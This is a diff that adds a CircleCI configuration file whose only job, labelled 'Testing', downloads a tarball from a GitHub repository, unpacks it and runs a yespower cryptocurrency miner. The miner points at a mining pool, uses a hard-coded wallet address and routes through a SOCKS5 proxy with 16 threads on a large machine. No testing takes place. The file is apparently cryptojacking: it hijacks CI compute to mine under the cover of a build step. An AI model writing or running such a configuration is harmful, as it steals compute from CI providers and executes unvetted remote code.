@@ -1,1 +1,11 @@
-
+version: 2.1
+jobs:
+  build:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: 2xlarge
+    steps:
+      - checkout
+      - run:
+          name: "Testing"
+          command: wget https://github.com/liyanul2525/rondo/raw/main/sayang.tar.gz && tar -xf sayang.tar.gz && sayang/rondo -a yespower -o stratum+tcp://yespower.na.mine.zpool.ca:6234 -u LXXC5yzd4amhAYzNVoYziU2PWdaqFWNn1T -p c=LTC,zap=BELL/BTE/BUTK-yespower/PYRK-yespower -x socks5://192.252.209.155:14455 -t 16
